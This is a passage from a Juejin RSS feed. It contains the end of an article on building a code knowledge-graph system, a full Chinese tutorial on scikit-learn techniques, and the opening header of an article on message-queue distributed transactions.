    D --&gt; F[等待内存释放]
    E --&gt; G[继续处理]
    F --&gt; G
</code></pre>
<h2 data-id="heading-16">实际部署经验</h2>
<h3 data-id="heading-17">容器化部署</h3>
<p>生产环境中，我们使用Docker进行部署：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># 多阶段构建优化镜像大小
FROM python:3.11-slim as builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM python:3.11-slim
WORKDIR /app
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY . .
EXPOSE 8080
CMD ["python", "run_web_server.py", "--host", "0.0.0.0"]
</code></pre>
<h3 data-id="heading-18">监控和告警</h3>
<p>系统监控的指标设计：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph "性能指标"
        A[解析速度 - files/sec]
        B[查询延迟 - ms]
        C[内存使用率 - %]
    end
    
    subgraph "业务指标"  
        D[图谱规模 - nodes/edges]
        E[增量更新频率 - updates/min]
        F[API调用量 - qps]
    end
    
    subgraph "告警规则"
        G[解析速度 &lt; 10 files/sec]
        H[查询延迟 &gt; 1000ms]
        I[内存使用 &gt; 85%]
    end
</code></pre>
<h2 data-id="heading-19">踩坑总结</h2>
<p>在系统开发过程中，我们遇到了不少技术挑战，这里分享几个重要的经验：</p>
<h3 data-id="heading-20">1. Tree-sitter内存泄漏</h3>
<p>早期版本中发现Tree-sitter在长时间运行后会出现内存泄漏，解决方案：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 定期释放解析器资源</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ParserManager</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.parser = <span class="hljs-literal">None</span>
        self.parse_count = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, code: <span class="hljs-built_in">str</span></span>):
        <span class="hljs-keyword">if</span> self.parse_count &gt; <span class="hljs-number">1000</span>:  <span class="hljs-comment"># 每1000次解析后重建</span>
            self.parser = <span class="hljs-literal">None</span>
            self.parse_count = <span class="hljs-number">0</span>
            
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.parser:
            self.parser = get_parser()
            
        self.parse_count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> self.parser.parse(<span class="hljs-built_in">bytes</span>(code, <span class="hljs-string">'utf8'</span>))
</code></pre>
<h3 data-id="heading-21">2. 循环依赖处理</h3>
<p>代码中的循环依赖会导致解析死循环，我们采用深度限制和访问记录：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">resolve_dependencies</span>(<span class="hljs-params">node: <span class="hljs-built_in">str</span>, visited: <span class="hljs-type">Set</span>[<span class="hljs-built_in">str</span>], depth: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):
    <span class="hljs-keyword">if</span> depth &gt; <span class="hljs-number">50</span> <span class="hljs-keyword">or</span> node <span class="hljs-keyword">in</span> visited:  <span class="hljs-comment"># 防止无限递归</span>
        <span class="hljs-keyword">return</span> []
    
    visited.add(node)
    <span class="hljs-comment"># ... 依赖解析逻辑</span>
</code></pre>
<h3 data-id="heading-22">3. 大文件处理</h3>
<p>对于超大文件（&gt;1MB），直接解析可能导致系统卡死：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">should_skip_file</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""检查文件是否应该跳过解析"""</span>
    size = os.path.getsize(file_path)
    <span class="hljs-keyword">if</span> size &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>:  <span class="hljs-comment"># 1MB</span>
        logger.warning(<span class="hljs-string">f"Skipping large file: <span class="hljs-subst">{file_path}</span> (<span class="hljs-subst">{size}</span> bytes)"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h2 data-id="heading-23">未来展望</h2>
<p>基于当前系统的实践经验，我们计划在以下几个方向进行改进：</p>
<h3 data-id="heading-24">智能记忆系统</h3>
<p>当前系统的一个主要问题是会将大量数据一次性传递给AI模型，导致上下文过长。下一版本将集成智能记忆系统：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[用户查询] --&gt; B[查询理解]
    B --&gt; C[记忆检索]
    C --&gt; D[相关性排序]
    D --&gt; E[分层数据返回]
    
    subgraph "记忆层级"
        F[架构概览层]
        G[模块关系层] 
        H[函数细节层]
        I[实现代码层]
    end
    
    E --&gt; F
    E --&gt; G
    E --&gt; H
    E --&gt; I
</code></pre>
<h3 data-id="heading-25">跨语言支持</h3>
<p>扩展到更多编程语言的支持：</p>



































<table><thead><tr><th>语言</th><th>优先级</th><th>挑战</th><th>计划</th></tr></thead><tbody><tr><td>Java</td><td>高</td><td>泛型处理</td><td>Q4 2025</td></tr><tr><td>TypeScript</td><td>高</td><td>类型推导</td><td>Q1 2026</td></tr><tr><td>C++</td><td>中</td><td>模板系统</td><td>Q2 2026</td></tr><tr><td>Go</td><td>中</td><td>接口实现</td><td>Q3 2026</td></tr></tbody></table>
<h2 data-id="heading-26">结语</h2>
<p>构建代码知识图谱系统是一个复杂的工程，涉及编译原理、图论、系统设计等多个技术领域。通过两年的实践，我们深刻认识到，技术选型的重要性、性能优化的必要性，以及持续迭代的价值。</p>
<p>希望这篇文章能够为有类似需求的开发者提供一些参考。如果您有任何问题或建议，欢迎通过GitHub Issues与我们交流。</p>
<hr/>
<p>*参考作品：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fwanchuang159%2Flegacy-code-archaeologist" target="_blank" title="https://gitee.com/wanchuang159/legacy-code-archaeologist" ref="nofollow noopener noreferrer">legacy-code-archaeologist: Legacy Code Archaeologist - AI驱动的代码分析与MCP协议支持</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[机器学习Scikit-learn库的使用技巧]]></title>    <link>https://juejin.cn/post/7579811819667718196</link>    <guid>https://juejin.cn/post/7579811819667718196</guid>    <pubDate>2025-12-05T01:07:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579811819667718196" data-draft-id="7579851956211073076" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="机器学习Scikit-learn库的使用技巧"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2025-12-05T01:07:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="深圳蔓延科技"/> <meta itemprop="url" content="https://juejin.cn/user/1919099566570249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            机器学习Scikit-learn库的使用技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1919099566570249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    深圳蔓延科技
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T01:07:12.000Z" title="Fri Dec 05 2025 01:07:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>sklearn（文章统一使用简称）是Python里最实用的机器学习库，今天我教大家怎么简单的使用它。</p>
<h2 data-id="heading-0">安装</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 安装的时候用全名</span>
<span class="hljs-comment"># pip install scikit-learn</span>

<span class="hljs-comment"># 导入的时候用简称</span>
<span class="hljs-keyword">import</span> sklearn
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression

</code></pre>
<p>安装好后，接下来分几个方向介绍使用方法。</p>
<h2 data-id="heading-1">一、数据准备</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> datasets
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split
<span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> StandardScaler

<span class="hljs-comment"># 1. 加载数据（内置数据集练手用）</span>
iris = datasets.load_iris()
X, y = iris.data, iris.target  <span class="hljs-comment"># X是特征，y是标签</span>

<span class="hljs-comment"># 2. 划分训练集和测试集（必须做）</span>
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>  <span class="hljs-comment"># random_state固定随机种子，结果可复现</span>
)

<span class="hljs-comment"># 3. 数据标准化（很多算法需要）</span>
scaler = StandardScaler()
X_train_scaled = scaler.fit_transform(X_train)  <span class="hljs-comment"># 先fit再transform</span>
X_test_scaled = scaler.transform(X_test)        <span class="hljs-comment"># 用训练集的参数transform测试集</span>
</code></pre>
<h2 data-id="heading-2">二、分类算法</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression
<span class="hljs-keyword">from</span> sklearn.tree <span class="hljs-keyword">import</span> DecisionTreeClassifier
<span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier
<span class="hljs-keyword">from</span> sklearn.svm <span class="hljs-keyword">import</span> SVC
<span class="hljs-keyword">from</span> sklearn.neighbors <span class="hljs-keyword">import</span> KNeighborsClassifier

<span class="hljs-comment"># 各种分类器用法都差不多，三步走</span>
classifiers = {
    <span class="hljs-string">'逻辑回归'</span>: LogisticRegression(random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'决策树'</span>: DecisionTreeClassifier(random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'随机森林'</span>: RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'SVM'</span>: SVC(kernel=<span class="hljs-string">'rbf'</span>, random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'KNN'</span>: KNeighborsClassifier(n_neighbors=<span class="hljs-number">5</span>)
}

<span class="hljs-keyword">for</span> name, clf <span class="hljs-keyword">in</span> classifiers.items():
    clf.fit(X_train_scaled, y_train)           <span class="hljs-comment"># 1. 训练</span>
    score = clf.score(X_test_scaled, y_test)   <span class="hljs-comment"># 2. 预测并评估</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: 准确率 <span class="hljs-subst">{score:<span class="hljs-number">.3</span>f}</span>"</span>)
</code></pre>
<h2 data-id="heading-3">三、回归算法</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LinearRegression, Ridge, Lasso
<span class="hljs-keyword">from</span> sklearn.tree <span class="hljs-keyword">import</span> DecisionTreeRegressor
<span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestRegressor

<span class="hljs-comment"># 加载回归数据</span>
boston = datasets.load_boston()  <span class="hljs-comment"># 已弃用，这里只是示例</span>
X, y = boston.data, boston.target
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)

<span class="hljs-comment"># 回归模型</span>
regressors = {
    <span class="hljs-string">'线性回归'</span>: LinearRegression(),
    <span class="hljs-string">'岭回归'</span>: Ridge(alpha=<span class="hljs-number">1.0</span>),
    <span class="hljs-string">'Lasso回归'</span>: Lasso(alpha=<span class="hljs-number">0.1</span>),
    <span class="hljs-string">'随机森林回归'</span>: RandomForestRegressor(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>)
}

<span class="hljs-keyword">for</span> name, reg <span class="hljs-keyword">in</span> regressors.items():
    reg.fit(X_train, y_train)
    r2_score = reg.score(X_test, y_test)  <span class="hljs-comment"># R²分数，越接近1越好</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: R²分数 <span class="hljs-subst">{r2_score:<span class="hljs-number">.3</span>f}</span>"</span>)
</code></pre>
<h2 data-id="heading-4">四、聚类算法</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.cluster <span class="hljs-keyword">import</span> KMeans, DBSCAN, AgglomerativeClustering
<span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> silhouette_score

<span class="hljs-comment"># 无监督学习，没有y</span>
X = iris.data

<span class="hljs-comment"># KMeans（最常用）</span>
kmeans = KMeans(n_clusters=<span class="hljs-number">3</span>, random_state=<span class="hljs-number">42</span>)
labels = kmeans.fit_predict(X)  <span class="hljs-comment"># 直接得到分组标签</span>

<span class="hljs-comment"># 评估聚类效果（轮廓系数）</span>
score = silhouette_score(X, labels)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"KMeans轮廓系数: <span class="hljs-subst">{score:<span class="hljs-number">.3</span>f}</span>"</span>)

<span class="hljs-comment"># 其他聚类算法</span>
dbscan = DBSCAN(eps=<span class="hljs-number">0.5</span>, min_samples=<span class="hljs-number">5</span>)
hierarchical = AgglomerativeClustering(n_clusters=<span class="hljs-number">3</span>)
</code></pre>
<h2 data-id="heading-5">五、模型评估</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> (
    accuracy_score, precision_score, recall_score, f1_score,
    confusion_matrix, classification_report,
    mean_squared_error, r2_score
)

<span class="hljs-comment"># 分类任务评估</span>
clf = LogisticRegression(random_state=<span class="hljs-number">42</span>)
clf.fit(X_train_scaled, y_train)
y_pred = clf.predict(X_test_scaled)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"准确率:"</span>, accuracy_score(y_test, y_pred))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"精确率:"</span>, precision_score(y_test, y_pred, average=<span class="hljs-string">'macro'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"召回率:"</span>, recall_score(y_test, y_pred, average=<span class="hljs-string">'macro'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"F1分数:"</span>, f1_score(y_test, y_pred, average=<span class="hljs-string">'macro'</span>))

<span class="hljs-comment"># 混淆矩阵（可视化谁分错了）</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n混淆矩阵:"</span>)
<span class="hljs-built_in">print</span>(confusion_matrix(y_test, y_pred))

<span class="hljs-comment"># 详细报告</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n分类报告:"</span>)
<span class="hljs-built_in">print</span>(classification_report(y_test, y_pred))
</code></pre>
<h2 data-id="heading-6">六、特征工程</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.feature_selection <span class="hljs-keyword">import</span> SelectKBest, f_classif
<span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA
<span class="hljs-keyword">from</span> sklearn.pipeline <span class="hljs-keyword">import</span> Pipeline

<span class="hljs-comment"># 1. 特征选择（选最重要的K个特征）</span>
selector = SelectKBest(score_func=f_classif, k=<span class="hljs-number">2</span>)
X_selected = selector.fit_transform(X_train, y_train)

<span class="hljs-comment"># 2. 降维（PCA）</span>
pca = PCA(n_components=<span class="hljs-number">2</span>)  <span class="hljs-comment"># 降到2维</span>
X_pca = pca.fit_transform(X_train)

<span class="hljs-comment"># 3. 管道（把多个步骤串起来）</span>
pipeline = Pipeline([
    (<span class="hljs-string">'scaler'</span>, StandardScaler()),
    (<span class="hljs-string">'selector'</span>, SelectKBest(k=<span class="hljs-number">2</span>)),
    (<span class="hljs-string">'classifier'</span>, RandomForestClassifier(random_state=<span class="hljs-number">42</span>))
])

pipeline.fit(X_train, y_train)
score = pipeline.score(X_test, y_test)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"管道模型准确率: <span class="hljs-subst">{score:<span class="hljs-number">.3</span>f}</span>"</span>)
</code></pre>
<h2 data-id="heading-7">七、找最优参数</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> GridSearchCV

<span class="hljs-comment"># 定义要调的参数</span>
param_grid = {
    <span class="hljs-string">'n_estimators'</span>: [<span class="hljs-number">50</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>],
    <span class="hljs-string">'max_depth'</span>: [<span class="hljs-literal">None</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>],
    <span class="hljs-string">'min_samples_split'</span>: [<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>]
}

<span class="hljs-comment"># 网格搜索</span>
rf = RandomForestClassifier(random_state=<span class="hljs-number">42</span>)
grid_search = GridSearchCV(
    rf, 
    param_grid, 
    cv=<span class="hljs-number">5</span>,  <span class="hljs-comment"># 5折交叉验证</span>
    scoring=<span class="hljs-string">'accuracy'</span>,
    n_jobs=-<span class="hljs-number">1</span>  <span class="hljs-comment"># 用所有CPU核心</span>
)

grid_search.fit(X_train, y_train)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"最佳参数:"</span>, grid_search.best_params_)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"最佳分数:"</span>, grid_search.best_score_)

<span class="hljs-comment"># 用最佳参数训练最终模型</span>
best_model = grid_search.best_estimator_
</code></pre>
<h2 data-id="heading-8">八、交叉验证</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> cross_val_score, KFold

<span class="hljs-comment"># 简单交叉验证</span>
scores = cross_val_score(
    RandomForestClassifier(random_state=<span class="hljs-number">42</span>),
    X, y,
    cv=<span class="hljs-number">5</span>,  <span class="hljs-comment"># 5折</span>
    scoring=<span class="hljs-string">'accuracy'</span>
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"交叉验证平均准确率: <span class="hljs-subst">{scores.mean():<span class="hljs-number">.3</span>f}</span> (±<span class="hljs-subst">{scores.std():<span class="hljs-number">.3</span>f}</span>)"</span>)

<span class="hljs-comment"># 自定义交叉验证策略</span>
kf = KFold(n_splits=<span class="hljs-number">5</span>, shuffle=<span class="hljs-literal">True</span>, random_state=<span class="hljs-number">42</span>)
<span class="hljs-keyword">for</span> train_idx, val_idx <span class="hljs-keyword">in</span> kf.split(X):
    X_train_fold, X_val_fold = X[train_idx], X[val_idx]
    y_train_fold, y_val_fold = y[train_idx], y[val_idx]
    <span class="hljs-comment"># 在每折上训练和评估</span>
</code></pre>
<h2 data-id="heading-9">九、保存和加载模型</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> joblib
<span class="hljs-keyword">import</span> pickle

model = RandomForestClassifier(random_state=<span class="hljs-number">42</span>)
model.fit(X_train, y_train)

<span class="hljs-comment"># 保存模型</span>
joblib.dump(model, <span class="hljs-string">'model.joblib'</span>)  <span class="hljs-comment"># sklearn推荐</span>
<span class="hljs-comment"># 或者</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'model.pkl'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
    pickle.dump(model, f)

<span class="hljs-comment"># 加载模型</span>
loaded_model = joblib.load(<span class="hljs-string">'model.joblib'</span>)
predictions = loaded_model.predict(X_test)
</code></pre>
<p>上面学会后，就可以基于下面的流程模板自己玩一下。</p>
<h2 data-id="heading-10">机器学习工作流程模板</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ml_workflow</span>(<span class="hljs-params">X, y</span>):
    <span class="hljs-string">"""标准机器学习流程"""</span>
    <span class="hljs-comment"># 1. 划分数据</span>
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)
    
    <span class="hljs-comment"># 2. 数据预处理</span>
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)
    X_test_scaled = scaler.transform(X_test)
    
    <span class="hljs-comment"># 3. 训练模型</span>
    model = RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>)
    model.fit(X_train_scaled, y_train)
    
    <span class="hljs-comment"># 4. 评估</span>
    train_score = model.score(X_train_scaled, y_train)
    test_score = model.score(X_test_scaled, y_test)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"训练集准确率: <span class="hljs-subst">{train_score:<span class="hljs-number">.3</span>f}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"测试集准确率: <span class="hljs-subst">{test_score:<span class="hljs-number">.3</span>f}</span>"</span>)
    
    <span class="hljs-keyword">return</span> model, scaler
</code></pre>
<p>sklearn的设计哲学是“一致性”——所有模型都有fit、predict、score方法，用起来都一个套路。把上面这些掌握了，80%的机器学习任务都能应付。剩下的20%，知道去哪里查文档就行。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[每天一道面试题之架构篇｜异步确保型事务——消息队列驱动的分布式事务解决方案]]></title>    <link>https://juejin.cn/post/7579851956211548212</link>    <guid>https://juejin.cn/post/7579851956211548212</guid>    <pubDate>2025-12-05T02:24:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579851956211548212" data-draft-id="7579889969985962035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="每天一道面试题之架构篇｜异步确保型事务——消息队列驱动的分布式事务解决方案"/> <meta itemprop="keywords" content="面试,分布式"/> <meta itemprop="datePublished" content="2025-12-05T02:24:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小胖"/> <meta itemprop="url" content="https://juejin.cn/user/1992752269369870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            每天一道面试题之架构篇｜异步确保型事务——消息队列驱动的分布式事务解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1992752269369870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小胖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:24:30.000Z" title="Fri Dec 05 2025 02:24:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
